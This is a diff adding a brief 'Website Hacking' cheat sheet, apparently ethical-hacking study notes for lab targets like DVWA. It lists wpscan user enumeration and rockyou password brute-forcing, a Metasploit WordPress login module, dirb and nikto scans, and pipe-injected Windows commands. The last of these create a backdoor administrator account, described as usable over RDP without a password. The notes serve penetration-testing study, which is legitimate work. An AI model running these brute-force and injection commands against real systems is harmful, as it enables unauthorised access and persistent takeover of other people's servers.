@@ -1,0 +1,73 @@
+
+
+
+Website Hacking
+
+
+
+# Wordpress site only Users Enumeration
+
+wpscan --url http://example.com/ceh --enumerate u
+
+
+# Direct crack if we have user/password details
+
+wpscan --url http://192.168.1.100/wordp/ -U users.txt –P  /usr/…./rockyou.txt
+
+-U  # can be one user also
+
+
+# Wordpress Using Metaspoilt
+
+msf > use auxiliary/scanner/http/wordpress_login_enum
+msf auxiliary(wordpress_login_enum) > set rhosts 192.168.1.100
+msf auxiliary(wordpress_login_enum) > set targeturi /wordp
+msf auxiliary(wordpress_login_enum) > set user_file user.txt
+msf auxiliary(wordpress_login_enum) > set pass_file pass.txt
+msf auxiliary(wordpress_login_enum) > exploit
+
+# user_file if list  & username if only one user 
+
+-----------------------------------------------------------------------------------
+
+
+
+#Dirb
+
+dirb   http://example.com  -X <.old or .xml or .bak>
+
+dirb     http://example.com
+
+# default wordlist on dirb       /usr/share/wordlists/dirb/common.txt
+/robots
+
+
+
+-------------------------------------------------------------------------------------
+
+
+
+#nikto
+
+Nikto  –h     http://example.com 
+
+
+--------------------------------------------------------------------------------------
+
+
+
+
+#Command Injection DVWA 
+
+| hostname
+| whoami
+| dir C:\path.txt
+| type path.txt
+
+| net user
+| net user Test /Add
+| net user
+| net user Test
+| net localgroup Administrators Test /Add
+
+# you can use this account to access through RDP Without password
